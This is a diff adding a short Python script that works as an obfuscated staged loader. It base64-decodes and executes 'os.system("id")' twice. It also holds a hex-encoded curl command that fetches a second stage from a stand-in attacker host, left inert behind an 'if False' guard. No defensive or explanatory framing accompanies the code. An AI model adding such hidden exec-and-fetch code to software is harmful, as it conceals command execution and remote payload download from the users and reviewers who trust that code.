@@ -1,0 +1,9 @@
+#!/usr/bin/env python3
+import base64
+
+BLOB = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik="
+exec(base64.b64decode(BLOB))
+exec(compile(base64.b64decode(BLOB), "<stage>", "exec"))
+
+SHELLCODE = "\x63\x75\x72\x6c\x20\x2d\x66\x73\x53\x4c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x61\x67\x65\x32\x2e\x65\x76\x69\x6c\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d"
+eval(compile(SHELLCODE, "<s>", "eval")) if False else None
